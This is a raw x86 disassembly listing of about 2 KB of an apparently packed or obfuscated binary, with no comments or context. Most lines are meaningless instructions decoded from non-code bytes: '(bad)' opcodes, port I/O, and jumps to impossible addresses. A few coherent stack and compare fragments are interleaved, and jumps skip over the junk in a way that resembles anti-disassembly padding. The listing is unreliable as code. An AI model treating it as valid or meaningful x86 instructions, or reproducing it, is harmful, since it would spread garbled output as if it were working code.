  40bc36:	out    dx,al
  40bc37:	mov    ds:0x788cb411,eax
  40bc3c:	push   ss
  40bc3d:	(bad)  
  40bc3e:	(bad)  
  40bc3f:	and    bh,ah
  40bc41:	push   cs
  40bc42:	fsubr  st(0),st
  40bc44:	fsubr  DWORD PTR [edi-0x5e]
  40bc47:	test   BYTE PTR [ebx+0xe242011],al
  40bc4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc4e:	adc    eax,0x504f74d1
  40bc53:	sub    eax,0x8dcf67a3
  40bc58:	lds    ecx,FWORD PTR [esi+0x774822f6]
  40bc5e:	test   DWORD PTR [edi],ecx
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	aas    
  40bc96:	xor    edx,esi
  40bc98:	rol    dh,cl
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	aad    0x53
  40bca3:	or     cl,BYTE PTR [eax-0x3a]
  40bca6:	or     esp,DWORD PTR [ebp-0x50]
  40bca9:	je     0x40bc2b
  40bcab:	push   ebp
  40bcac:	lods   eax,DWORD PTR ds:[esi]
  40bcad:	shl    edx,cl
  40bcaf:	jmp    0xaeb9fd50
  40bcb4:	int3   
  40bcb5:	clc    
  40bcb6:	mov    bh,0x3
  40bcb8:	out    0x5b,eax
  40bcba:	rol    DWORD PTR [edi],cl
  40bcbc:	rcl    ch,1
  40bcbe:	test   DWORD PTR [edx+0x18],0x2cb1272c
  40bcc5:	mov    dh,0x38
  40bcc7:	sub    BYTE PTR [eax],ch
  40bcc9:	stos   DWORD PTR es:[edi],eax
  40bcca:	lods   al,BYTE PTR ds:[esi]
  40bccb:	jl     0x40bc69
  40bccd:	out    0xc6,al
  40bccf:	pop    ds
  40bcd0:	rcr    DWORD PTR [edx+ebp*2+0x78],cl
  40bcd4:	cmp    eax,0xbeaf261b
  40bcd9:	lods   eax,DWORD PTR ds:[esi]
  40bcda:	fs mov ebp,0xb3dad9f3
  40bce0:	adc    edi,esp
  40bce2:	test   BYTE PTR [esi],ch
  40bce4:	xchg   esi,eax
  40bce5:	push   ecx
  40bce6:	int3   
  40bce7:	popf   
  40bce8:	fld    DWORD PTR ds:0x67ef1e4
  40bcee:	aaa    
  40bcef:	ins    DWORD PTR es:[edi],dx
  40bcf0:	fiadd  WORD PTR [ebx+ebx*2-0x58a63e15]
  40bcf7:	xor    eax,DWORD PTR [ecx+0x347fac1f]
  40bcfd:	inc    eax
  40bcfe:	push   ebx
  40bcff:	cmp    eax,0xbe7758b7
  40bd04:	(bad)  
  40bd06:	jmp    0xa797cbab
  40bd0b:	and    cl,BYTE PTR [edx-0x1f]
  40bd0e:	xlat   BYTE PTR ds:[ebx]
  40bd0f:	inc    esi
  40bd10:	into   
  40bd11:	push   0xa164f62c
  40bd16:	cmp    eax,0x71d80bc8
  40bd1b:	rol    dh,0x2c
  40bd1e:	xor    al,0x54
  40bd20:	sub    ch,BYTE PTR [esi+eax*4-0x77]
  40bd24:	mov    cl,0xff
  40bd26:	cld    
  40bd27:	sbb    DWORD PTR [esi+0x7e],ebx
  40bd2a:	popa   
  40bd2b:	popf   
  40bd2c:	ins    DWORD PTR es:[edi],dx
  40bd2d:	ret    
  40bd2e:	xchg   edx,eax
  40bd2f:	add    edi,edi
  40bd31:	fisubr WORD PTR cs:[ebp+0x1bac9cda]
  40bd38:	cmc    
  40bd39:	mov    ecx,0xe26b755d
  40bd3e:	pop    ecx
  40bd3f:	jle    0x40bd06
  40bd41:	fcomp  QWORD PTR [esi]
  40bd43:	mov    ch,0x7b
  40bd45:	sub    eax,0x1d3808a5
  40bd4a:	es icebp 
  40bd4c:	fisubr WORD PTR [esi]
  40bd4e:	dec    di
  40bd50:	jne    0x40bd80
  40bd52:	inc    esi
  40bd53:	add    BYTE PTR [esi+0x2200abd9],bl
  40bd59:	inc    ecx
  40bd5a:	cld    
  40bd5b:	adc    edx,DWORD PTR [esp+edi*2+0x15]
  40bd5f:	adc    ecx,ebx
  40bd61:	cli    
  40bd62:	sub    ecx,DWORD PTR [esi]
  40bd64:	pop    ds
  40bd65:	and    eax,0x4f3970fa
  40bd6a:	fist   WORD PTR [ebp-0x64]
  40bd6d:	out    0x2f,al
  40bd6f:	das    
  40bd70:	adc    BYTE PTR [edx],ch
  40bd72:	mov    eax,ds:0x40223b67
  40bd77:	xor    bl,BYTE PTR [ecx-0x24]
  40bd7a:	pop    esp
  40bd7b:	outs   dx,BYTE PTR ds:[esi]
  40bd7c:	xchg   esi,eax
  40bd7d:	das    
  40bd7e:	add    eax,DWORD PTR [ebx*8+0x34b1ecc9]
  40bd85:	je     0x40bdca
  40bd87:	pop    ebp
  40bd88:	inc    BYTE PTR [ecx]
  40bd8a:	gs xchg ebx,eax
  40bd8c:	mov    ah,0x3d
  40bd8e:	push   edx
  40bd8f:	xchg   ebx,eax
  40bd90:	cmp    ah,BYTE PTR [esi+ecx*4-0x2d]
  40bd94:	aas    
  40bd95:	inc    ebx
  40bd96:	aad    0x2d
  40bd98:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd9a:	mov    ah,0xdf
  40bd9c:	aad    0xc9
  40bd9e:	dec    edx
  40bd9f:	push   ebx
  40bda0:	je     0x40bd92
  40bda2:	(bad)  
  40bda3:	scas   eax,DWORD PTR es:[edi]
  40bda4:	gs ins DWORD PTR es:[edi],dx
  40bda6:	int3   
  40bda7:	scas   al,BYTE PTR es:[edi]
  40bda8:	add    DWORD PTR [edx+edi*4+0x8ce13f8],ebp
  40bdaf:	jno    0x40bdca
  40bdb1:	out    0x24,al
  40bdb3:	add    eax,0x1589f3cd
  40bdb8:	je     0x40bdb1
  40bdba:	mov    bl,0xc8
  40bdbc:	jno    0x40bde6
  40bdbe:	push   0x233dc6a1
  40bdc3:	adc    eax,0xbf010d19
  40bdc8:	dec    esi
  40bdc9:	pop    ds
  40bdca:	lea    edi,[eax]
  40bdcc:	fs jns 0x40bd55
  40bdcf:	and    al,0x97
  40bdd1:	and    ax,0x8567
  40bdd5:	(bad)  
  40bdd6:	xor    eax,0x6b85ce41
  40bddb:	or     ebx,0x32749c65
  40bde1:	jno    0x40bde7
  40bde3:	sub    BYTE PTR [ebp-0x40],bl
  40bde6:	dec    edx
  40bde7:	(bad)  
  40bde8:	xchg   esp,eax
  40bde9:	sub    edi,DWORD PTR [eax+ecx*2]
  40bdec:	inc    ecx
  40bded:	xchg   esp,eax
  40bdee:	fild   DWORD PTR [edx-0x75fa4f59]
  40bdf4:	pop    edi
  40bdf5:	out    0xbf,eax
  40bdf7:	jmp    0x40bde8
  40bdf9:	xchg   ebp,eax
  40bdfa:	enter  0x747e,0x59
  40bdfe:	push   0xffffffda
  40be00:	jp     0x40bda3
  40be02:	loopne 0x40be1b
  40be04:	pushf  
  40be05:	inc    esp
  40be06:	call   0xa1c2:0x69915c59
  40be0d:	inc    edx
  40be0e:	arpl   dx,bx
  40be10:	addr16 inc ebp
  40be12:	adc    eax,0x34e6c540
  40be17:	cdq    
  40be18:	(bad)  
  40be19:	or     eax,0x3cd588ce
  40be1e:	mov    bh,0x92
  40be20:	hlt    
  40be21:	ret    0xfcb2
  40be24:	rcr    DWORD PTR [esi],1
  40be26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be27:	mov    ah,0x49
  40be29:	add    DWORD PTR [edx+eiz*4],0xe98fe144
  40be30:	mov    BYTE PTR [esp+ebx*2-0x7b5cda51],dl
  40be37:	adc    esi,esi
  40be39:	mov    al,ds:0xe9e4aa84
  40be3e:	stos   BYTE PTR es:[edi],al
  40be3f:	inc    eax
  40be40:	cmp    DWORD PTR [edi-0x32f3e2a8],ecx
  40be46:	pop    ecx
  40be47:	add    DWORD PTR [edx],esp
  40be49:	(bad)  ds:0x3c706631
  40be4f:	pop    ebx
  40be50:	mov    eax,0xfa21a2f1
  40be55:	lds    esi,FWORD PTR [edx+0xc65c25a]
  40be5b:	cld    
  40be5c:	lods   al,BYTE PTR ds:[esi]
  40be5d:	addr16 daa 
  40be5f:	jnp    0x40be5f
  40be61:	unpcklps xmm1,XMMWORD PTR [edx-0x232b827c]
  40be68:	or     BYTE PTR [ebx],al
  40be6a:	dec    esi
  40be6b:	loopne 0x40be11
  40be6d:	inc    edi
  40be6e:	inc    eax
  40be6f:	out    dx,eax
  40be70:	sub    ebx,esp
  40be72:	dec    DWORD PTR [ecx+0x6a67b9f6]
  40be78:	or     al,0x26
  40be7a:	pop    ebp
  40be7b:	xchg   ebp,eax
  40be7c:	push   ebp
  40be7d:	cs retf 
  40be7f:	rcr    ebp,cl
  40be81:	dec    esp
  40be82:	mov    ah,0xa7
  40be84:	into   
  40be85:	xchg   esp,eax
  40be86:	retf   
  40be87:	mov    dh,0xd5
  40be89:	bound  edi,QWORD PTR [eax+0x27]
  40be8c:	(bad)  
  40be8d:	jecxz  0x40be97
  40be8f:	cld    
  40be90:	mov    ebx,0x903cbd8f
  40be95:	and    al,0xbf
  40be97:	or     eax,0x49478a21
  40be9c:	daa    
  40be9d:	push   esi
  40be9e:	jl     0x40be81
  40bea0:	jle    0x40bec9
  40bea2:	dec    ebp
  40bea3:	mov    es,WORD PTR [esi+0xe]
  40bea6:	cli    
  40bea7:	aad    0xf6
  40bea9:	out    dx,al
  40beaa:	test   eax,0x2c59207f
  40beaf:	push   ss
  40beb0:	fsub   QWORD PTR [edi-0x2f]
  40beb3:	dec    ebx
  40beb4:	mov    esp,0xf38565ff
  40beb9:	imul   ecx,DWORD PTR ss:[eax],0xcc978d9e
  40bec0:	aad    0x92
  40bec2:	sahf   
  40bec3:	or     al,ch
  40bec5:	icebp  
  40bec6:	xchg   esp,eax
  40bec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec8:	nop
  40bec9:	pop    eax
  40beca:	jmp    0xbbca:0x4e1e3511
  40bed1:	cmp    eax,0x79615266
  40bed6:	gs std 
  40bed8:	adc    bh,BYTE PTR ds:0xcce90bb8
  40bede:	ret    0xe185
  40bee1:	int    0x49
  40bee3:	cs push esp
  40bee5:	fisttp DWORD PTR [edi+0x51085435]
  40beeb:	pop    es
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x3a7d1b31]
  40bf27:	hlt    
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bef6
  40bf31:	jmp    0xbebc:0x47a0c25b
  40bf38:	jmp    0xf0fe7772
  40bf3d:	jbe    0x40bf8a
  40bf3f:	push   ebx
  40bf40:	loopne 0x40befe
  40bf42:	ret    0xf162
  40bf45:	and    BYTE PTR [ebp+0x5],0xd3
  40bf49:	adc    BYTE PTR [ebx+0x68af4130],0x15
  40bf50:	es pop ebp
  40bf52:	cmp    al,0x82
  40bf54:	stc    
  40bf55:	lock push 0x7f26f6bb
  40bf5b:	out    dx,al
  40bf5c:	int    0x8a
  40bf5e:	bswap  esi
  40bf60:	lock inc ebx
  40bf62:	scas   al,BYTE PTR es:[edi]
  40bf63:	inc    esi
  40bf64:	xchg   ebp,eax
  40bf65:	dec    ecx
  40bf66:	test   eax,0xfdaa5ba4
  40bf6b:	or     eax,0x8a5bc87c
  40bf70:	mov    ecx,0x15ce4561
  40bf75:	outs   dx,DWORD PTR ds:[esi]
  40bf76:	mov    ecx,0x916d9494
  40bf7b:	sbb    eax,DWORD PTR [edi]
  40bf7d:	mov    DWORD PTR [ecx-0x16ee3523],esp
  40bf83:	int    0xb
  40bf85:	in     eax,0x65
  40bf87:	pushf  
  40bf88:	test   eax,0xee3e0cc1
  40bf8d:	popa   
  40bf8e:	sahf   
  40bf8f:	(bad)  
  40bf90:	frstor [eax-0x62467927]
  40bf96:	test   BYTE PTR [ebx],ch
  40bf98:	push   eax
  40bf99:	inc    edi
  40bf9a:	dec    ecx
  40bf9b:	xor    edx,DWORD PTR [esi-0x6d]
  40bf9e:	dec    ebx
  40bf9f:	xor    al,0xe1
  40bfa1:	jmp    0xa6023fcf
  40bfa6:	mov    edx,DWORD PTR [esi-0x1b]
  40bfa9:	inc    esp
  40bfaa:	test   DWORD PTR [ecx+0x7f],ecx
  40bfad:	mov    bh,0xaa
  40bfaf:	int3   
  40bfb0:	pusha  
  40bfb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb2:	ins    BYTE PTR es:[edi],dx
  40bfb3:	out    0x36,eax
  40bfb5:	iret   
  40bfb6:	out    dx,eax
  40bfb7:	or     dh,BYTE PTR [edx+0x1]
  40bfba:	pop    edi
  40bfbb:	mov    ds:0xe96698aa,al
  40bfc0:	in     eax,0x42
  40bfc2:	cdq    
  40bfc3:	popf   
  40bfc4:	add    al,0x9d
  40bfc6:	jmp    0x757d3d53
  40bfcb:	fdiv   DWORD PTR [ecx-0x2a]
  40bfce:	mov    esi,0xa883db73
  40bfd3:	add    al,0xd7
  40bfd5:	loope  0x40c048
  40bfd7:	cli    
  40bfd8:	mov    eax,0xd3c6d2e0
  40bfdd:	pop    esp
  40bfde:	push   ss
  40bfdf:	js     0x40bf7b
  40bfe1:	(bad)  
  40bfe3:	jo     0x40bf88
  40bfe5:	lods   al,BYTE PTR ds:[esi]
  40bfe6:	es dec esi
  40bfe8:	push   0xffffffb8
  40bfea:	or     BYTE PTR [esi-0xb],0x7e
  40bfee:	adc    al,0xdf
  40bff0:	jge    0x40c067
  40bff2:	and    al,0x14
  40bff4:	mov    eax,ds:0xf104de34
  40bff9:	xchg   esi,eax
  40bffa:	sbb    eax,0x321b1c62
  40bfff:	jno    0x40c018
  40c001:	rol    DWORD PTR [edx],1
  40c003:	lods   al,BYTE PTR ds:[esi]
  40c004:	call   0x33b55ec6
  40c009:	xor    al,0x3
  40c00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c00c:	jbe    0x40c01d
  40c00e:	popa   
  40c00f:	mov    ebp,0xcaa6c095
  40c014:	aaa    
  40c015:	lahf   
  40c016:	lahf   
  40c017:	or     al,0xf7
  40c019:	xlat   BYTE PTR ds:[ebx]
  40c01a:	push   ds
  40c01b:	rcr    DWORD PTR [esi+0x4f],cl
  40c01e:	add    eax,0x9d9140e8
  40c023:	stos   BYTE PTR es:[edi],al
  40c024:	mov    ds:0xeac41b2,al
  40c029:	ret    0xcaf2
  40c02c:	shl    DWORD PTR [edi+0xc7ff19a],cl
  40c032:	add    DWORD PTR [esp+edi*2],ebx
  40c035:	ss int3 
  40c037:	aas    
  40c038:	push   es
  40c039:	cmp    cl,BYTE PTR [esi]
  40c03b:	dec    edx
  40c03c:	mov    ds:0x640e0cec,al
  40c041:	popa   
  40c042:	sbb    al,0xe
  40c044:	sahf   
  40c045:	test   DWORD PTR [esi],edi
  40c047:	retf   
  40c048:	pop    eax
  40c049:	jmp    0x40bfd6
  40c04b:	xchg   ch,cl
  40c04d:	add    DWORD PTR [edx+0x6de5eabb],esp
  40c053:	mov    ecx,0xbde2607
  40c058:	jmp    0x40c09c
  40c05a:	gs pop ecx
  40c05c:	pushf  
  40c05d:	cmp    ecx,DWORD PTR [edi]
  40c05f:	push   ss
  40c060:	fdivr  DWORD PTR ds:0x60e16479
  40c066:	in     al,dx
  40c067:	sub    DWORD PTR [ecx+0x57],esp
  40c06a:	aad    0xab
  40c06c:	jo     0x40c0be
  40c06e:	imul   ebp,DWORD PTR [esi+0x58f03689],0xffffffc4
  40c075:	push   ecx
  40c076:	push   ds
  40c077:	test   eax,0x1143d304
  40c07c:	cmp    BYTE PTR [ebp+0x48e95514],bl
  40c082:	repz add DWORD PTR ds:0xe3b13854,0xffffffb4
  40c08a:	setnp  BYTE PTR ds:0x746892c
  40c091:	push   ecx
  40c092:	(bad)  
  40c093:	sub    al,0x42
  40c095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c096:	cld    
  40c097:	cmp    dl,dl
  40c099:	lods   eax,DWORD PTR ds:[esi]
  40c09a:	jae    0x40c060
  40c09c:	jecxz  0x40c066
  40c09e:	cmp    al,0xcd
  40c0a0:	sub    esp,ecx
  40c0a2:	adc    al,0x16
  40c0a4:	push   eax
  40c0a5:	stc    
  40c0a6:	(bad)  
  40c0a7:	fadd   DWORD PTR [ecx+0x9df1c3c]
  40c0ad:	jmp    0x90a402b7
  40c0b2:	loop   0x40c08f
  40c0b4:	adc    al,0xbe
  40c0b6:	sub    BYTE PTR [ecx+0xa89878c],cl
  40c0bc:	adc    DWORD PTR [ecx+0x1899b57f],0xae9190df
  40c0c6:	jmp    0x725f4693
  40c0cb:	add    al,0x68
  40c0cd:	fisubr DWORD PTR [edi]
  40c0cf:	lea    ecx,[esi]
  40c0d1:	fs xchg cl,al
  40c0d4:	pop    ebx
  40c0d5:	mov    ebx,0x3f317c6f
  40c0da:	gs jmp 0x4ea88822
  40c0e0:	sbb    al,0x2
  40c0e2:	adc    ebp,DWORD PTR [edi]
  40c0e4:	dec    ecx
  40c0e5:	in     al,dx
  40c0e6:	shl    DWORD PTR [ebp-0x4f673899],1
  40c0ec:	sub    edx,DWORD PTR [edx+0x4a51d19a]
  40c0f2:	fwait
  40c0f3:	cmp    DWORD PTR [edi-0x64],edx
  40c0f6:	and    ebx,eax
  40c0f8:	(bad)  
  40c0f9:	push   eax
  40c0fa:	fldcw  WORD PTR [ecx+0x5f8f36a5]
  40c100:	sti    
  40c101:	push   ecx
  40c102:	mov    edi,DWORD PTR [ebp-0x3d8ceda9]
  40c108:	adc    esp,DWORD PTR [edi+0x2d]
  40c10b:	pop    esi
  40c10c:	neg    DWORD PTR [edi+0x42d5171b]
  40c112:	cli    
  40c113:	adc    eax,0x8aa3ed2b
  40c118:	mov    ds:0x6e3d1ba,eax
  40c11d:	sub    eax,0x14ad51b5
  40c122:	(bad)  
  40c123:	lock mov bl,dh
  40c126:	fs xor al,0x48
  40c129:	ficomp WORD PTR [eax+0x3b18e755]
  40c12f:	sub    ebp,esp
  40c131:	pop    edx
  40c132:	(bad)  
  40c133:	cmp    al,0xca
  40c135:	sbb    eax,0xabbdc5f8
  40c13a:	frstor cs:[edi]
  40c13d:	in     eax,0x6
  40c13f:	sti    
  40c140:	test   BYTE PTR [edi],dl
  40c142:	aas    
  40c143:	int    0x40
  40c145:	ja     0x40c15a
  40c147:	mov    cl,0x1f
  40c149:	jmp    0x40c10c
  40c14b:	push   cs
  40c14c:	cmp    ch,BYTE PTR [esi+0x45658878]
  40c152:	xor    BYTE PTR [eax-0x3f],cl
  40c155:	outs   dx,BYTE PTR ds:[esi]
  40c156:	cld    
  40c157:	cmp    dh,BYTE PTR [eax+0x6172ae45]
  40c15d:	scas   eax,DWORD PTR es:[edi]
  40c15e:	inc    edx
  40c15f:	stos   DWORD PTR es:[edi],eax
  40c160:	or     al,0xff
  40c162:	jb     0x40c107
  40c164:	push   es
  40c165:	fdivr  st(1),st
  40c167:	mov    al,dl
  40c169:	into   
  40c16a:	xchg   ebp,eax
  40c16b:	cmp    BYTE PTR [edx],ch
  40c16d:	inc    edx
  40c16e:	(bad)  
  40c16f:	test   al,0x7a
  40c171:	add    BYTE PTR [eax],cl
  40c173:	sub    eax,0xcb87b5a4
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x5d
  40c196:	hlt    
  40c197:	add    eax,0x7e874ab0
  40c19c:	jle    0x40c1d6
  40c19e:	jl     0x40c21e
  40c1a0:	jle    0x40c166
  40c1a2:	or     BYTE PTR [ebx+0x51],0x5b
  40c1a6:	xor    DWORD PTR [ecx+edx*2],ebx
  40c1a9:	sub    edx,esi
  40c1ab:	sub    eax,0xe933e883
  40c1b0:	cdq    
  40c1b1:	shl    BYTE PTR [ebp-0x2a],cl
  40c1b4:	inc    esi
  40c1b5:	inc    eax
  40c1b6:	lahf   
  40c1b7:	(bad)  
  40c1b9:	pop    ss
  40c1ba:	jecxz  0x40c229
  40c1bc:	adc    BYTE PTR [eax],bl
  40c1be:	adc    BYTE PTR [ebp-0x5a],cl
  40c1c1:	popa   
  40c1c2:	xor    eax,eax
  40c1c4:	xchg   ebx,eax
  40c1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1c6:	jmp    0x40c21c
  40c1c8:	retf   0x9739
  40c1cb:	jmp    0x40c163
  40c1cd:	mov    bh,0x83
  40c1cf:	mov    ecx,0xf0cfb245
  40c1d4:	xchg   BYTE PTR [eax+esi*8],ah
  40c1d7:	adc    BYTE PTR [eax-0x25],0xc0
  40c1db:	pop    ss
  40c1dc:	push   es
  40c1dd:	and    dl,ch
  40c1df:	cmp    eax,0x26121523
  40c1e4:	lock jae 0x40c243
  40c1e7:	inc    esp
  40c1e8:	sub    al,0xcd
  40c1ea:	sbb    esi,eax
  40c1ec:	pop    ebp
  40c1ed:	cld    
  40c1ee:	test   ch,ch
  40c1f0:	aam    0x7a
  40c1f2:	sbb    DWORD PTR [ecx+edi*4],esi
  40c1f5:	enter  0x46e9,0xf3
  40c1f9:	imul   esp,ebp,0x7f
  40c1fc:	inc    edx
  40c1fd:	cmp    BYTE PTR [eax+0x13718702],dh
  40c203:	mov    eax,ds:0x46bf7a1c
  40c208:	stos   DWORD PTR es:[edi],eax
  40c209:	aaa    
  40c20a:	sub    DWORD PTR [ebp+0x60],edi
  40c20d:	pushf  
  40c20e:	aam    0x58
  40c210:	dec    ecx
  40c211:	dec    edx
  40c212:	or     ebx,edx
  40c214:	adc    al,0xcb
  40c216:	pop    esi
  40c217:	je     0x40c221
  40c219:	pop    ecx
  40c21a:	pop    edx
  40c21b:	xor    DWORD PTR ds:0xfcdc737b,ebx
  40c221:	call   0xc68c:0xf060f982
  40c228:	adc    BYTE PTR [eax+0xbb5e9dd],cl
  40c22e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c22f:	outs   dx,DWORD PTR ds:[esi]
  40c230:	outs   dx,BYTE PTR ds:[esi]
  40c231:	bound  esp,QWORD PTR [edi+0x2d7961b6]
  40c237:	cmp    ah,ah
  40c239:	mov    esp,0xd5e2be78
  40c23e:	je     0x40c2bc
  40c240:	ss or  esp,eax
  40c243:	pop    esi
  40c244:	xchg   edi,eax
  40c245:	mov    dl,0x98
  40c247:	sahf   
  40c248:	dec    edx
  40c249:	dec    edi
  40c24a:	arpl   WORD PTR [ebp+0x6fb699f9],sp
  40c250:	xchg   ebp,eax
  40c251:	ins    BYTE PTR es:[edi],dx
  40c252:	(bad)
  40c255:	leave  
  40c256:	cmp    DWORD PTR [ebp-0x55],edi
  40c259:	xchg   edi,eax
  40c25a:	pop    esp
  40c25b:	mov    es,WORD PTR [esi-0x43]
  40c25e:	mov    ebx,0x9bcb156e
  40c263:	inc    edx
  40c264:	in     al,0xb2
  40c266:	xchg   ebx,eax
  40c267:	out    0xce,al
  40c269:	push   ds
  40c26a:	sbb    al,0x19
  40c26c:	add    eax,0xd845b601
  40c271:	fwait
  40c272:	popw   ds
  40c274:	loopne 0x40c2a7
  40c276:	mov    dh,0x61
  40c278:	sub    dh,bh
  40c27a:	adc    BYTE PTR [eax+edi*2+0x30],cl
  40c27e:	pop    esp
  40c27f:	(bad)  
  40c280:	(bad)  
  40c281:	outs   dx,BYTE PTR ds:[esi]
  40c282:	js     0x40c2f0
  40c284:	pushf  
  40c285:	call   0xa006:0xe3809001
  40c28c:	xor    DWORD PTR [ecx+0x717670a9],ecx
  40c292:	adc    cl,BYTE PTR [ebp+0x1d]
  40c295:	xchg   edx,eax
  40c296:	pop    ds
  40c297:	mov    al,0x99
  40c299:	sbb    al,0xe5
  40c29b:	inc    edi
  40c29c:	mov    dh,BYTE PTR [ebp+0x481d807e]
  40c2a2:	push   cs
  40c2a3:	and    bh,cl
  40c2a5:	adc    ebx,ecx
  40c2a7:	cmp    ebx,DWORD PTR [edx]
  40c2a9:	or     ah,BYTE PTR [edx]
  40c2ab:	fst    DWORD PTR [esi+0x7]
  40c2ae:	imul   edi,DWORD PTR [esi-0x10],0xffffff97
  40c2b2:	jno    0x40c2de
  40c2b4:	xor    eax,0x93375b6a
  40c2b9:	mov    BYTE PTR [ecx+0x2e],bh
  40c2bc:	push   edx
  40c2bd:	inc    eax
  40c2be:	push   cs
  40c2bf:	leave  
  40c2c0:	xlat   BYTE PTR ds:[ebx]
  40c2c1:	aaa    
  40c2c2:	cmp    BYTE PTR [ebp+0x28],bl
  40c2c5:	jns    0x40c276
  40c2c7:	adc    DWORD PTR ds:0x5d19bcdf,0xffffffde
  40c2ce:	out    0x77,al
  40c2d0:	mov    eax,0x7c9c206d
  40c2d5:	dec    ebx
  40c2d6:	pop    ds
  40c2d7:	xor    DWORD PTR [ecx-0x23b641d7],ebx
  40c2dd:	ins    DWORD PTR es:[edi],dx
  40c2de:	jb     0x40c32d
  40c2e0:	loopne 0x40c2d7
  40c2e2:	cmc    
  40c2e3:	xchg   esi,eax
  40c2e4:	cmp    DWORD PTR [ebp-0x68b705bf],esp
  40c2ea:	dec    edx
  40c2eb:	rcr    bl,1
  40c2ed:	push   ecx
  40c2ee:	pop    es
  40c2ef:	(bad)  [ecx]
  40c2f1:	test   DWORD PTR [ecx-0x3c99144a],0x6697523c
  40c2fb:	sti    
  40c2fc:	sub    eax,0x85772fc2
  40c301:	ficomp DWORD PTR [esi+eiz*4]
  40c304:	arpl   WORD PTR [edi],di
  40c306:	hlt    
  40c307:	sbb    DWORD PTR [ebx-0x4e],edi
  40c30a:	push   cs
  40c30b:	mov    DWORD PTR [ecx+0x35],0x47992af8
  40c312:	dec    ecx
  40c313:	cwde   
  40c314:	bound  edx,QWORD PTR [eax+0x1cebdb63]
  40c31a:	aas    
  40c31b:	pop    ss
  40c31c:	cs mov ch,0x8c
  40c31f:	out    0x47,eax
  40c321:	lahf   
  40c322:	daa    
  40c323:	jecxz  0x40c345
  40c325:	pop    ecx
  40c326:	dec    edi
  40c327:	add    ah,bl
  40c329:	sbb    BYTE PTR [ebp+ebx*8-0x37a989dc],ah
  40c330:	jbe    0x40c2e6
  40c332:	jo     0x40c368
  40c334:	cwde   
  40c335:	mov    cl,0x23
  40c337:	mov    WORD PTR [eax+edx*4],ss
  40c33a:	scas   eax,DWORD PTR es:[edi]
  40c33b:	push   esp
  40c33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c33d:	push   edi
  40c33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c33f:	xchg   ecx,eax
  40c340:	pusha  
  40c341:	fldcw  WORD PTR [ecx]
  40c343:	add    al,0x35
  40c345:	ja     0x40c308
  40c347:	jecxz  0x40c34a
  40c349:	mov    edx,0xfae9c203
  40c34e:	and    esp,DWORD PTR [esi]
  40c350:	cmp    al,0x5d
  40c352:	mov    bh,0x9a
  40c354:	dec    edx
  40c355:	fwait
  40c356:	sbb    ah,BYTE PTR [esi]
  40c358:	adc    DWORD PTR [edi],ecx
  40c35a:	add    al,0x5b
  40c35c:	push   0xf7deee2b
  40c361:	hlt    
  40c362:	aaa    
  40c363:	jmp    0x40c330
  40c365:	nop
  40c366:	add    eax,0xf9406fa2
  40c36b:	add    dl,BYTE PTR [esp+ebx*1]
  40c36e:	into   
  40c36f:	(bad)  
  40c370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c371:	fild   DWORD PTR [ebx-0x22]
  40c374:	addr16 out dx,eax
  40c376:	sti    
  40c377:	repnz daa 
  40c379:	iret   
  40c37a:	call   0xec7b20ea
  40c37f:	pop    eax
  40c380:	scas   al,BYTE PTR es:[edi]
  40c381:	ror    DWORD PTR [edi],0x10
  40c384:	(bad)  
  40c385:	lods   al,BYTE PTR ds:[esi]
  40c386:	cmp    eax,0x60f1f924
  40c38b:	sbb    eax,0xe3a35ef4
  40c390:	pushf  
